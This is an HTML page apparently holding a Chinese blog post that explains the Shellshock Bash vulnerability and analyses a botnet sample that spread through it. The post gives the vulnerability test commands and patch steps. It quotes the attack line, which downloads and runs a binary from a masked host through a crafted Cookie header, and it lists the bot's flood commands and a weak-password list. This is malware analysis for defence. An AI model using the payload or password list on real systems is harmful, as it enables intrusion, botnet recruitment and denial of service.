@@ -1,0 +1,1335 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="googleaf0347feb5ea0936.html" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="linux,shell," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="上善若水" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="一.漏洞事件介绍1.漏洞信息123●发布时间:2014-09-25　14时48分04秒●CVE ID:CVE-2014-6271●受影响版本:  2.漏洞概述Bash(GNU Bourne-Again Shell)是大多数Linux系统以及Mac OS X v10.4默认的shell，它能运行于大多数Unix风格的操作系统之上，甚至被移植到了Microsoft Windows上的Cygwin系统中">
+<meta name="keywords" content="linux,shell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shellshock原理介绍">
+<meta property="og:url" content="http://yoursite.com/2017/09/09/shellshock原理介绍/index.html">
+<meta property="og:site_name" content="上善若水">
+<meta property="og:description" content="一.漏洞事件介绍1.漏洞信息123●发布时间:2014-09-25　14时48分04秒●CVE ID:CVE-2014-6271●受影响版本:  2.漏洞概述Bash(GNU Bourne-Again Shell)是大多数Linux系统以及Mac OS X v10.4默认的shell，它能运行于大多数Unix风格的操作系统之上，甚至被移植到了Microsoft Windows上的Cygwin系统中">
+<meta property="og:image" content="http://image.3001.net/images/20140929/14119555774668.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20140929/14119556446899.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20140929/14119557242937.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20140929/14119557383644.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20140929/14119557523092.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20140929/14119557641898.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20140929/14119557764384.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20140929/14119557914517.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20140929/14119558016271.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20140929/14119558124398.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20140929/14119558398157.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20140929/14119558506793.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20140929/14119558625359.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20140929/14119558712704.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20140929/14119558833165.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20140929/14119558966991.png%21small">
+<meta property="og:image" content="http://image.3001.net/images/20140929/14119559071040.png%21small">
+<meta property="og:updated_time" content="2017-09-09T06:02:03.126Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="shellshock原理介绍">
+<meta name="twitter:description" content="一.漏洞事件介绍1.漏洞信息123●发布时间:2014-09-25　14时48分04秒●CVE ID:CVE-2014-6271●受影响版本:  2.漏洞概述Bash(GNU Bourne-Again Shell)是大多数Linux系统以及Mac OS X v10.4默认的shell，它能运行于大多数Unix风格的操作系统之上，甚至被移植到了Microsoft Windows上的Cygwin系统中">
+<meta name="twitter:image" content="http://image.3001.net/images/20140929/14119555774668.png%21small">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.2',
+    sidebar: {"position":"right","display":"post","offset":12,"offset_float":12,"b2t":true,"scrollpercent":true,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/09/09/shellshock原理介绍/"/>
+
+
+
+
+
+  <title>shellshock原理介绍 | 上善若水</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?663212c5ef558c27e77385b620f14823";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">上善若水</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">古之立大事者，不惟有超世之才，亦必有坚韧不拔之志！</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/09/shellshock原理介绍/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">shellshock原理介绍</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-09T13:18:47+08:00">
+                2017-09-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="一-漏洞事件介绍"><a href="#一-漏洞事件介绍" class="headerlink" title="一.漏洞事件介绍"></a><strong>一.漏洞事件介绍</strong></h2><h3 id="1-漏洞信息"><a href="#1-漏洞信息" class="headerlink" title="1.漏洞信息"></a><strong>1.漏洞信息</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">●发布时间:2014-09-25　14时48分04秒</div><div class="line">●CVE ID:CVE-2014-6271</div><div class="line">●受影响版本:</div></pre></td></tr></table></figure>
+<p><a href="http://image.3001.net/images/20140929/14119555774668.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119555774668.png%21small" alt="受ShellShock影响的版本"></a></p>
+<h3 id="2-漏洞概述"><a href="#2-漏洞概述" class="headerlink" title="2.漏洞概述"></a><strong>2.漏洞概述</strong></h3><p><strong>Bash(GNU Bourne-Again Shell)</strong>是大多数Linux系统以及Mac OS X v10.4默认的shell，它能运行于大多数Unix风格的操作系统之上，甚至被移植到了Microsoft Windows上的Cygwin系统中，以实现windows的POSIX虚拟接口.</p>
+<p>Bash其广泛的使用将意味全球至少 150 万的主机将受到影响，此外 Linux/Unix 世界内的安卓和苹果都难以幸免。</p>
+<p><a href="http://www.freebuf.com/news/44805.html" target="_blank" rel="external">破壳漏洞（ShellShock）</a>的严重性被定义为 10 级（最高）,而今年 4 月爆发的 OpenSSL(心脏出血)漏洞才 5 级！</p>
+<h3 id="3-漏洞成因"><a href="#3-漏洞成因" class="headerlink" title="3.漏洞成因:"></a><strong>3.漏洞成因:</strong></h3><p>Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统</p>
+<p>受到该漏洞影响的bash使用的环境变量是通过函数名称来调用的，以“(){”开头通过环境变量来定义的。而在处理这样的“函数环境变量”的时候，并没有以函数结尾“}”为结束，而是一直执行其后的shell命令</p>
+<h3 id="4-漏洞测试"><a href="#4-漏洞测试" class="headerlink" title="4.漏洞测试:"></a><strong>4.漏洞测试:</strong></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(1).CVE-2014-6271 测试方式:</div><div class="line">      env x='() &#123; :;&#125;; exp' bash -c "echo this is a test" </div><div class="line">(2).CVE-2014-7169 测试方式:(CVE-2014-6271补丁更新后仍然可以绕过)</div><div class="line">      env -i X=';() &#123; (a)=&gt;\' bash -c 'echo date'; cat echo</div></pre></td></tr></table></figure>
+<h3 id="5-修复方案"><a href="#5-修复方案" class="headerlink" title="5.修复方案"></a><strong>5.修复方案</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">请广大站长及时关注官网的安全补丁更新</div><div class="line">(1).针对RedHat、CentOS Liunx发行版本，请执行：</div><div class="line">    yum -y update bash</div><div class="line">(2).针对Debian Liunx发行版本，请执行：</div><div class="line">    sudo apt-get update &amp;&amp; sudo apt-get install --only-upgrade bash</div></pre></td></tr></table></figure>
+<h2 id="二-样本概述"><a href="#二-样本概述" class="headerlink" title="二.样本概述"></a><strong>二.样本概述</strong></h2><h3 id="●样本来源"><a href="#●样本来源" class="headerlink" title="●样本来源:"></a><strong>●样本来源:</strong></h3><p>由于2014年9月24日法国某Linux爱好者公布了BASH漏洞(CVE-2014-6721),时至今日网络上已有利用该漏洞的病毒样本,我们于今日捕获到该漏洞样本,并进行了紧急分析</p>
+<h3 id="●文件信息"><a href="#●文件信息" class="headerlink" title="●文件信息:"></a><strong>●文件信息:</strong></h3><p>文件名:nginx</p>
+<p>文件大小:525KB</p>
+<p>MD5:5924bcc045bb7039f55c6ce29234e29a  </p>
+<p><a href="http://image.3001.net/images/20140929/14119556446899.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119556446899.png%21small" alt="Bash 样本文件信息"></a></p>
+<h3 id="●行为概述"><a href="#●行为概述" class="headerlink" title="●行为概述:"></a><strong>●行为概述:</strong></h3><p>该漏洞样本利用Bash漏洞进行传播扩散,并使用Linux Shell命令wget下载该样本并执行,该样本执行后首先会收集系统相关的信息(CPU,网络配置等信息),紧接着样本连接到自己的服务器,通过接受服务器发送的指令,来远程控制被感染机器,进而组建僵尸网络,进行洪水攻击,以及入侵中国某厂商,而入侵之后主要是为了莱特币的挖取</p>
+<h2 id="三-样本详细分析"><a href="#三-样本详细分析" class="headerlink" title="三.样本详细分析"></a><strong>三.样本详细分析</strong></h2><h3 id="1-样本传播方式"><a href="#1-样本传播方式" class="headerlink" title="1.样本传播方式"></a><strong>1.样本传播方式</strong></h3><p>该样本利用Bash漏洞进行传播,其漏洞的利用只需要简单的几行命令即可,这无疑为利用者带来了极大的便利,利用代码如下:</p>
+<p><a href="http://image.3001.net/images/20140929/14119557242937.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119557242937.png%21small" alt="Bash样本利用代码"></a></p>
+<p>而该样本通过wget将样本下载并执行,利用漏洞命令如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Cookie, ().&#123;.:;.&#125;;.wget /tmp/besh http://X.X.X.X/nginx; chmod.777 /tmp/besh; /tmp/besh;</div></pre></td></tr></table></figure>
+<h3 id="2-样本行为分析"><a href="#2-样本行为分析" class="headerlink" title="2.样本行为分析"></a><strong>2.样本行为分析</strong></h3><p><strong>(1).获取计算机相关信息</strong></p>
+<p>该样本启动后首先会获取计算机的相关信息,如CPU,网络配置等信息</p>
+<p><a href="http://image.3001.net/images/20140929/14119557383644.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119557383644.png%21small" alt="Bash样本获取计算机信息"></a></p>
+<p><strong>(2).接着该样本连接自己的服务器(89.238.150.154:5)</strong></p>
+<p>strace附加在创建的子进程样本上监视其行为如下:</p>
+<p><a href="http://image.3001.net/images/20140929/14119557523092.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119557523092.png%21small" alt="Bash样本连接自己的服务器"></a></p>
+<p>但是C&amp;C的server已经挂掉了</p>
+<p><strong>(3).如果连接服务器成功,则根据服务器传来的指令,远程控制被感染机器,命令集合如下:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">PING </div><div class="line">GETLOCALIP </div><div class="line">SCANNER </div><div class="line">HOLD (DoS Flood) </div><div class="line">JUNK (DoS Flood) </div><div class="line">UDP (DoS Flood) </div><div class="line">TCP (DoS Flood) </div><div class="line">KILLATTK </div><div class="line">LOLNOGTFO</div></pre></td></tr></table></figure>
+<p><strong>●PING命令:</strong></p>
+<p><a href="http://image.3001.net/images/20140929/14119557641898.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119557641898.png%21small" alt="Bash样本服务器的PING命令"></a></p>
+<p>类似于心跳包,测试客户端服务器是否连接成功</p>
+<p><strong>●GETLOCALIP</strong></p>
+<p><a href="http://image.3001.net/images/20140929/14119557764384.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119557764384.png%21small" alt="发送本机IP地址到目标服务器"></a></p>
+<p>发送本机IP地址到目标服务器</p>
+<p><strong>●SCANNER</strong></p>
+<p>其主要是通过Busybox来对字符进行解析,从而设定扫描攻击目标,然后通过DVR scanner来对目标DVR设备进行扫描,看是否存在DVR漏洞,进而发起攻击</p>
+<p><a href="http://image.3001.net/images/20140929/14119557914517.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119557914517.png%21small" alt="Bash样本SCANNER"></a></p>
+<p>我们通过busybox来对该字符串进行解析得到</p>
+<p><a href="http://image.3001.net/images/20140929/14119558016271.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558016271.png%21small" alt="字符串剖析结果"></a></p>
+<p>然而在样本中,我们发现:</p>
+<p><a href="http://image.3001.net/images/20140929/14119558124398.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558124398.png%21small" alt="Bash样本中DVR Scanner"></a></p>
+<p>DVR Scanner主要测试目标是否存在DVR漏洞,如果存在则尝试通过像”root”,”12345”这样的弱口令进行进行连接,如果连接成功,则执行ps尝试寻找”cmd.so”进程,该进程主要是莱特币矿工相关.</p>
+<p>于是可以高度怀疑通过此方法来挖取莱特币</p>
+<p>程序中存在的弱口令表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">root </div><div class="line">admin </div><div class="line">user </div><div class="line">login </div><div class="line">guest </div><div class="line">toor </div><div class="line">changeme </div><div class="line">1234 </div><div class="line">12345 </div><div class="line">123456 </div><div class="line">default </div><div class="line">pass </div><div class="line">password</div></pre></td></tr></table></figure>
+<p><strong>●HOLD (Dos Flood)</strong></p>
+<p><a href="http://image.3001.net/images/20140929/14119558398157.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558398157.png%21small" alt="对目标服务器进行Hold洪水攻击"></a></p>
+<p>对目标服务器进行Hold洪水攻击,通过接受服务器数据包,来指明需要攻击的秒数,并将攻击时间返回给服务器</p>
+<p><strong>●JUNK (DoS Flood) </strong></p>
+<p><a href="http://image.3001.net/images/20140929/14119558506793.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558506793.png%21small" alt="对目标服务器进行JUNK洪水攻击"></a></p>
+<p>对目标服务器进行JUNK洪水攻击</p>
+<p><strong>●UDP (DoS Flood)</strong> </p>
+<p><a href="http://image.3001.net/images/20140929/14119558625359.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558625359.png%21small" alt="对目标服务器进行UDP洪水攻击"></a></p>
+<p>对目标服务器进行UDP洪水攻击</p>
+<p><strong>●TCP (DoS Flood) </strong></p>
+<p><a href="http://image.3001.net/images/20140929/14119558712704.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558712704.png%21small" alt="对目标服务器进行TCP洪水攻击"></a></p>
+<p>对目标服务器进行TCP洪水攻击</p>
+<p><strong>●KILLATTK </strong></p>
+<p><a href="http://image.3001.net/images/20140929/14119558833165.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558833165.png%21small" alt="通过接受服务器发来的进程列表,通过kill系统调用杀掉指定的进程"></a></p>
+<p>通过接受服务器发来的进程列表,通过kill系统调用杀掉指定的进程</p>
+<p><strong>●LOLNOGTFO</strong></p>
+<p><a href="http://image.3001.net/images/20140929/14119558966991.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558966991.png%21small" alt="非法服务器数据包指令"></a></p>
+<p>非法服务器数据包指令</p>
+<h2 id="三-后台漏洞检测"><a href="#三-后台漏洞检测" class="headerlink" title="三.后台漏洞检测"></a><strong>三.后台漏洞检测</strong></h2><p>漏洞爆发之后,我们在后台对全国范围内的相关网站进行了一次统计,我们发现了某公司的NAS设备管理页面存在cgi漏洞,而通过查看网站页面，发现设备是类似“TS-119P”， 设备名都是TS-XX的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">备注：NAS是一种网络存储设备，现在的很多路由器也支持此功能，如果此设备有漏洞，那么里面的资源都会有被盗的风险。XXX门将会再现江湖</div></pre></td></tr></table></figure>
+<p>为此我们搭建了一个后台页面,来对网址进行检测,查看是否存在Bash漏洞</p>
+<p><a href="http://image.3001.net/images/20140929/14119559071040.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119559071040.png%21small" alt="ShellShock检测页面"></a></p>
+<p><strong>检测网址如下:</strong></p>
+<p><a href="http://fish.ijinshan.com/cgibincheck" target="_blank" rel="external">http://fish.ijinshan.com/cgibincheck</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/linux/" rel="tag"># linux</a>
+          
+            <a href="/tags/shell/" rel="tag"># shell</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+          <div class="wp_rating">
+            <div id="wpac-rating"></div>
+          </div>
+        
+
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/09/08/ARM寄存器结构小记/" rel="next" title="ARM寄存器结构小记">
+                <i class="fa fa-chevron-left"></i> ARM寄存器结构小记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/09/09/shell下的进制转换/" rel="prev" title="shell下的进制转换">
+                shell下的进制转换 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/me.jpg"
+               alt="Introspelliam" />
+          <p class="site-author-name" itemprop="name">Introspelliam</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+           
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+            
+              <a href="/archives/">
+            
+                <span class="site-state-item-count">128</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">54</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/Introspelliam" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                    
+                      GitHub
+                    
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/u/3008590672" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                    
+                      Weibo
+                    
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一-漏洞事件介绍"><span class="nav-number">1.</span> <span class="nav-text">一.漏洞事件介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-漏洞信息"><span class="nav-number">1.1.</span> <span class="nav-text">1.漏洞信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-漏洞概述"><span class="nav-number">1.2.</span> <span class="nav-text">2.漏洞概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-漏洞成因"><span class="nav-number">1.3.</span> <span class="nav-text">3.漏洞成因:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-漏洞测试"><span class="nav-number">1.4.</span> <span class="nav-text">4.漏洞测试:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-修复方案"><span class="nav-number">1.5.</span> <span class="nav-text">5.修复方案</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二-样本概述"><span class="nav-number">2.</span> <span class="nav-text">二.样本概述</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#●样本来源"><span class="nav-number">2.1.</span> <span class="nav-text">●样本来源:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#●文件信息"><span class="nav-number">2.2.</span> <span class="nav-text">●文件信息:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#●行为概述"><span class="nav-number">2.3.</span> <span class="nav-text">●行为概述:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三-样本详细分析"><span class="nav-number">3.</span> <span class="nav-text">三.样本详细分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-样本传播方式"><span class="nav-number">3.1.</span> <span class="nav-text">1.样本传播方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-样本行为分析"><span class="nav-number">3.2.</span> <span class="nav-text">2.样本行为分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三-后台漏洞检测"><span class="nav-number">4.</span> <span class="nav-text">三.后台漏洞检测</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Introspelliam</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+  <span class="post-meta-divider">|</span>
+
